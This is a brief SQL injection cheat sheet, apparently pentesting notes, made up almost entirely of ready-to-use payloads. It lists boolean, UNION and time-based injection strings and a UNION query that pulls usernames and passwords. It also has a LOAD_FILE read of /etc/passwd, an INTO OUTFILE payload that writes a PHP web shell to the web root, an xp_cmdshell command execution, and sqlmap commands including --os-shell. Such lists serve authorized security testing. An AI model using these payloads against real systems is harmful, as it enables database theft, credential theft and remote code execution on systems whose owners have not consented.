# SQL Injection

**Quick Checklist**
- [ ] Error on quote? (`'`)
- [ ] Boolean / time-based?
- [ ] UNION possible?
- [ ] Error-based?
- [ ] Can get RCE?

**Basic Tests**
```sql
'
' OR '1'='1
' AND '1'='2
' OR 1=1--
```

**UNION**
```sql
' ORDER BY 1--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
```

**Time-Based**
```sql
' AND SLEEP(5)--
' WAITFOR DELAY '0:0:5'--
```

**File Operations**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
'; EXEC xp_cmdshell 'whoami'--
```

**sqlmap**
```bash
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" --batch --os-shell
```
